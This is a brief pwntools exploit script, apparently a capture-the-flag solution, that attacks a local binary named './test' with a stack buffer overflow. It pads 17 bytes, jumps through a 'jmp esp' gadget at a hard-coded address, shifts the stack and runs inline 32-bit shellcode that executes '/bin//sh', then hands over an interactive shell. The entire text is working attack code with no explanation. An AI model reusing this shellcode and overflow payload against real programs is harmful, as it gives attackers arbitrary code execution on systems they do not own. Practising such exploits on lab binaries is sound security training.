from pwn import *

sh = process("./test")
jmp_esp = 0x8049178
shellcode = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = flat(['a'*17, jmp_esp, asm("add esp,8;jmp esp"), 'aaa', shellcode])
sh.sendline(payload)
sh.interactive()
